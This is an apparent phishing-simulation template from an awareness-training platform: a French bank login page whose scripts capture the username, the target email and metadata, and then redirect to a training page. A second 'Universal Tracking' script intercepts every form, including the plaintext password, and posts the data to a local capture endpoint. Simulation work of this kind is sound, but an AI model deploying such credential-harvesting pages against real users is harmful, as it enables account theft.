<!DOCTYPE html><html lang="fr"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portail Bancaire Sécurisé</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #e0e7ff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 100%;
            max-width: 450px;
            text-align: center;
        }
        .logo {
            margin-bottom: 30px;
        } 
        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 20px;
            color: #1a202c;
        }
        p {
            font-size: 16px;
            color: #4a5568;
            margin-bottom: 30px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px 18px;
            margin-bottom: 20px;
            border: 1px solid #cbd5e0;
            border-radius: 8px;
            font-size: 17px;
            box-sizing: border-box;
            transition: border-color 0.2s ease;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #4c51bf;
            outline: none;
        }
        button {
            width: 100%;
            padding: 15px 20px;
            background-color: #4c51bf;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        button:hover {
            background-color: #3f45a8;
        }
        button:disabled {
            background-color: #9ca3af;
            cursor: not-allowed;
        }
        .extra-links {
            margin-top: 25px;
            font-size: 14px;
        }
        .extra-links a {
            color: #4c51bf;
            text-decoration: none;
            margin: 0 10px;
        }
        .extra-links a:hover {
            text-decoration: underline;
        }
        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            display: none;
        }
    </style>

<body>
    <div class="login-container">
        <div class="logo"> 
            <svg class="mx-auto" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#4c51bf" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="2" y="7" width="20" height="15" rx="2" ry="2"></rect>
                <path d="M12 12V2m-5 5v-2a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v2"></path>
            </svg>
        </div>
        <h1>Accès à votre Compte</h1>
        <p>Veuillez saisir vos identifiants pour accéder à votre portail bancaire sécurisé.</p>
        
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Identifiant ou numéro de client" required="">
            <input type="password" id="password" name="password" placeholder="Mot de passe" required="">
            <button type="submit" id="loginButton">
                <div class="loading-spinner" id="loadingSpinner"></div>
                <span id="buttonText">Se connecter</span>
                <span class="loading-text" id="loadingText">Connexion...</span>
            </button>
        </form>
        
        <div class="extra-links">
            <a href="#">Mot de passe oublié ?</a> | <a href="#">Aide</a>
        </div>
    </div>

    <script>
        // Récupérer les paramètres depuis l'URL
        function getCampaignIdFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            const pathParts = window.location.pathname.split('/');
            // L'ID de campagne est dans le path /phishing/CAMPAIGN_ID
            return pathParts[2] || urlParams.get('campaignId');
        }

        function getTargetEmailFromUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('email');
        }

        // Configuration
        const CONFIG = {
            REACT_APP_URL: window.location.origin,
            CAMPAIGN_ID: getCampaignIdFromUrl(),
            TARGET_EMAIL: getTargetEmailFromUrl()
        };

        // Gestionnaire de soumission du formulaire
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const button = document.getElementById('loginButton');
            const buttonText = document.getElementById('buttonText');
            const loadingText = document.getElementById('loadingText');
            const loadingSpinner = document.getElementById('loadingSpinner');

            // Validation basique
            if (!username || !password) {
                alert('Veuillez remplir tous les champs.');
                return;
            }

            // Afficher l'état de chargement
            button.disabled = true;
            buttonText.style.display = 'none';
            loadingText.style.display = 'inline';
            loadingSpinner.style.display = 'inline-block';

            // CORRECTION MAJEURE : Envoyer les données de phishing AVANT la redirection
            const phishingData = {
                campaignId: CONFIG.CAMPAIGN_ID,
                targetEmail: CONFIG.TARGET_EMAIL,
                timestamp: new Date().toISOString(),
                triggerType: 'form_submission',
                formData: {
                    username: username,
                    password: '***HIDDEN***' // Ne pas stocker le mot de passe en clair
                },
                userAgent: navigator.userAgent,
                url: window.location.href,
                referrer: document.referrer
            };

            // CORRECTION : Utiliser la bonne URL pour l'envoi des données
            const captureUrl = `/api/phishing/${CONFIG.CAMPAIGN_ID}/capture`;
            console.log('📊 Envoi des données vers:', captureUrl);

            // Envoyer les données en arrière-plan
            fetch(captureUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(phishingData)
            })
            .then(response => {
                console.log('📊 Réponse capture:', response.status);
                return response.json();
            })
            .then(data => {
                console.log('✅ Données capturées avec succès:', data);
            })
            .catch(error => {
                console.warn('⚠️ Erreur lors de l\'envoi des données:', error);
                // Continuer même en cas d'erreur de capture
            })
            .finally(() => {
                // CORRECTION : Redirection vers /training/ au lieu de /learning/
                setTimeout(() => {
                    const trainingUrl = `/training/${CONFIG.CAMPAIGN_ID}?email=${encodeURIComponent(CONFIG.TARGET_EMAIL)}`;
                    console.log('🔄 Redirection vers:', trainingUrl);
                    window.location.href = trainingUrl;
                }, 1500);
            });
        });

        // Initialisation avec debug amélioré
        document.addEventListener('DOMContentLoaded', function() {
            console.log('📋 Page de phishing initialisée');
            console.log('🏷️ Campaign ID:', CONFIG.CAMPAIGN_ID);
            console.log('📧 Target Email:', CONFIG.TARGET_EMAIL);
            console.log('🌐 Current URL:', window.location.href);
            
            // Vérifications de sécurité
            if (!CONFIG.CAMPAIGN_ID) {
                console.error('❌ ERREUR: Campaign ID manquant dans l\'URL');
            }
            if (!CONFIG.TARGET_EMAIL) {
                console.warn('⚠️ ATTENTION: Email cible manquant dans l\'URL');
            }
        });

        // Fonction de debug accessible depuis la console
        window.debugPhishingPage = function() {
            return {
                config: CONFIG,
                urls: {
                    current: window.location.href,
                    capture: `/api/phishing/${CONFIG.CAMPAIGN_ID}/capture`,
                    training: `/training/${CONFIG.CAMPAIGN_ID}?email=${encodeURIComponent(CONFIG.TARGET_EMAIL)}`
                },
                form: {
                    username: document.getElementById('username').value,
                    hasPassword: !!document.getElementById('password').value
                }
            };
        };

        console.log('✅ Template HTML de phishing corrigé chargé');
        console.log('🧪 Utilisez debugPhishingPage() dans la console pour déboguer');
    </script>



    <script>
      (function() {
        // Custom alert function to replace native alert()
        window.customAlert = function(message) {
          console.log('Custom Alert:', message);
          // You can implement a more sophisticated modal/message box here if needed.
          // For now, it just logs to console.
          // Example: alert(message); // If you still want the native alert for simulation
        };

        console.log('🎯 PhishWise Universal Tracking activated');

        // Wait for DOM to be ready
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', initTracking);
        } else {
          initTracking();
        }

        function initTracking() {
          // Intercept all forms
          const forms = document.querySelectorAll('form');
          console.log('📝 Forms detected:', forms.length);

          forms.forEach(function(form, index) {
            form.addEventListener('submit', function(e) {
              e.preventDefault();
              console.log('📋 Form submission intercepted:', index);

              // Collect all form data
              const formData = new FormData(form);
              const data = {};

              // Extract data from inputs
              for (let [key, value] of formData.entries()) {
                data[key] = value;
              }

              // Add inputs not included in FormData (e.g., unchecked checkboxes, disabled inputs)
              const inputs = form.querySelectorAll('input, select, textarea');
              inputs.forEach(function(input) {
                if (input.name && typeof data[input.name] === 'undefined') { // Only add if not already in formData
                  if (input.type === 'checkbox' || input.type === 'radio') {
                    data[input.name] = input.checked ? input.value : ''; // Capture checked state
                  } else {
                    data[input.name] = input.value;
                  }
                }
              });

              // Tracking metadata
              data._campaignId = '68adde92fcafc01be14b4842';
              data._timestamp = new Date().toISOString();
              data._userAgent = navigator.userAgent;
              data._referrer = document.referrer;
              data._url = window.location.href;
              data._formIndex = index;
              data._formAction = form.action || 'N/A';
              data._formMethod = form.method || 'GET';

              console.log('📊 Collected data:', data);

              // Send data
              fetch('http://localhost:3000/api/phishing/capture', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
              }).then(function(response) {
                console.log('✅ Data sent successfully');
                // Redirect to learning page
                window.location.href = 'http://localhost:3000/learning/68adde92fcafc01be14b4842';
              }).catch(function(error) {
                console.error('❌ Error sending data:', error);
                // Redirect even on error
                setTimeout(function() {
                  window.location.href = 'http://localhost:3000/learning/68adde92fcafc01be14b4842';
                }, 1000);
              });
            });
          });

          // Track link clicks
          document.addEventListener('click', function(e) {
            const link = e.target.closest('a');
            if (link) {
              const href = link.href;
              console.log('🔗 Link clicked:', href);

              // Send click event
              fetch('http://localhost:3000/api/phishing/track-click', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                  campaignId: '68adde92fcafc01be14b4842',
                  clickedUrl: href,
                  linkText: link.textContent.trim(),
                  timestamp: new Date().toISOString(),
                  userAgent: navigator.userAgent
                })
              }).catch(console.error);
            }
          });

          // Track input field interactions (focus)
          const inputs = document.querySelectorAll('input, textarea, select');
          inputs.forEach(function(input) {
            input.addEventListener('focus', function() {
              console.log('🎯 Focus on:', input.name || input.type || input.id || 'unknown field');
            });
          });

          console.log('🚀 Universal tracking initialized');
        }
      })();
    </script>
</body></html>
